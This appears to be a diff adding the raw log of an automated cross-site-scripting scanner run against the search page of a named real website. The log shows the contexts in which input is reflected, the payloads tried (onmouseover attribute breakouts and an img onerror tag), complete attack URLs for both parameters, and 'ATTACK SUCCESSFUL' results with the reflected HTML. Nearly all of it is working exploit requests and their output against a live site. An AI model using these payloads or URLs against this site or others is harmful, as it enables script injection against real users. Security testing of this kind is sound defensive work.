@@ -1,0 +1,274 @@
+https://www.techscience.com/results
+
+GET Params:[2]
+['key1', 'key2']
+_______________________________________________________________________________________________________
+https://www.techscience.com/results?key1=(uvw"xyz'yxz</zxy&key2=
+
+----------------------------------------------------------------------------------
+Attribute Context: [3]
+<input type="text"   style="width:100%"    placeholder=""  name="key1" value="(uvw"xyz'yxz</zxy"  />
+<form action="https://www.techscience.com/results?key1=%28uvw%22xyz%27yxz%3C%2Fzxy&key2="  method="get"   accept-charset="utf-8">
+<input type="hidden" name="key1" value="(uvw"xyz'yxz</zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [1]
+<div class="result" style="margin-bottom:0px; padding: 10px 0px; float: left; width: 100%; font-weight: bold">Search Parameters:Keywords=(uvw"xyz'yxz</zxy</div>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script>
+    function change_per_page(t) {
+        var val = $(t).val();
+        window.location = "https://www.techscience.com/results?key1=%28uvw%22xyz%27yxz%3C%2Fzxy&key2=&per_page=1&rows=" + val;
+    }
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [4]
+<a  class="a_select"    href="https://www.techscience.com/results?key1=%28uvw%22xyz%27yxz%3C%2Fzxy&key2=&orderby=">
+<a href="https://www.techscience.com/results?key1=%28uvw%22xyz%27yxz%3C%2Fzxy&key2=&orderby=publishtime"   >
+<a href="https://www.techscience.com/results?key1=%28uvw%22xyz%27yxz%3C%2Fzxy&key2=&orderby=views"   >
+<form action="https://www.techscience.com/results?key1=%28uvw%22xyz%27yxz%3C%2Fzxy&key2="  method="get"   accept-charset="utf-8">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	False	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.techscience.com/results?key1=" onmouseover="alert(1)&key2=
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input type="text"   style="width:100%"    placeholder=""  name="key1" value="" onmouseover="alert(1)"  />
+<input type="hidden" name="key1" value="" onmouseover="alert(1)" />
+
+ATTR Attack Url: https://www.techscience.com/results?key1=' onmouseover='alert(1)&key2=
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="text"   style="width:100%"    placeholder=""  name="key1" value="' onmouseover='alert(1)"  />
+<input type="hidden" name="key1" value="' onmouseover='alert(1)" />
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	False	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.techscience.com/results?key1=" onmouseover="alert(1)&key2=
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input type="text"   style="width:100%"    placeholder=""  name="key1" value="" onmouseover="alert(1)"  />
+<input type="hidden" name="key1" value="" onmouseover="alert(1)" />
+
+ATTR Attack Url: https://www.techscience.com/results?key1=' onmouseover='alert(1)&key2=
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="text"   style="width:100%"    placeholder=""  name="key1" value="' onmouseover='alert(1)"  />
+<input type="hidden" name="key1" value="' onmouseover='alert(1)" />
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.techscience.com/results?key1=<img src=x onerror="alert(1)">&key2=
+
+=> ATTACK SUCCESSFUL with Payload: <img src=x onerror="alert(1)">
+Detection of Payload: 
+<div class="result" style="margin-bottom:0px; padding: 10px 0px; float: left; width: 100%; font-weight: bold">Search Parameters:Keywords=<img src=x onerror="alert(1)"></div>
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.techscience.com/results?key1=&key2=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [3]
+<input type="text"    style="width:100%"    placeholder=""  name="key2" value="(uvw"xyz'yxz</zxy"  />
+<form action="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy"  method="get"   accept-charset="utf-8">
+<input type="hidden" name="key2" value="(uvw"xyz'yxz</zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [1]
+<div class="result" style="margin-bottom:0px; padding: 10px 0px; float: left; width: 100%; font-weight: bold">Search Parameters:Keywords=,(uvw"xyz'yxz</zxy</div>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script>
+    function change_per_page(t) {
+        var val = $(t).val();
+        window.location = "https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=1&rows=" + val;
+    }
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [12]
+<a  class="a_select"    href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&orderby=">
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&orderby=publishtime"   >
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&orderby=views"   >
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=2" data-ci-pagination-page="2">
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=3" data-ci-pagination-page="3">
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=2" data-ci-pagination-page="2" rel="next">
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=681" data-ci-pagination-page="681">
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=2" data-ci-pagination-page="2">
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=3" data-ci-pagination-page="3">
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=2" data-ci-pagination-page="2" rel="next">
+<a href="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy&per_page=681" data-ci-pagination-page="681">
+<form action="https://www.techscience.com/results?key1=&key2=%28uvw%22xyz%27yxz%3C%2Fzxy"  method="get"   accept-charset="utf-8">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	False	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.techscience.com/results?key1=&key2=" onmouseover="alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input type="text"    style="width:100%"    placeholder=""  name="key2" value="" onmouseover="alert(1)"  />
+<input type="hidden" name="key2" value="" onmouseover="alert(1)" />
+
+ATTR Attack Url: https://www.techscience.com/results?key1=&key2=' onmouseover='alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="text"    style="width:100%"    placeholder=""  name="key2" value="' onmouseover='alert(1)"  />
+<input type="hidden" name="key2" value="' onmouseover='alert(1)" />
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	False	False	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.techscience.com/results?key1=&key2=" onmouseover="alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input type="text"    style="width:100%"    placeholder=""  name="key2" value="" onmouseover="alert(1)"  />
+<input type="hidden" name="key2" value="" onmouseover="alert(1)" />
+
+ATTR Attack Url: https://www.techscience.com/results?key1=&key2=' onmouseover='alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="text"    style="width:100%"    placeholder=""  name="key2" value="' onmouseover='alert(1)"  />
+<input type="hidden" name="key2" value="' onmouseover='alert(1)" />
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.techscience.com/results?key1=&key2=<img src=x onerror="alert(1)">
+
+=> ATTACK SUCCESSFUL with Payload: <img src=x onerror="alert(1)">
+Detection of Payload: 
+<div class="result" style="margin-bottom:0px; padding: 10px 0px; float: left; width: 100%; font-weight: bold">Search Parameters:Keywords=,<img src=x onerror="alert(1)"></div>
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	True
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
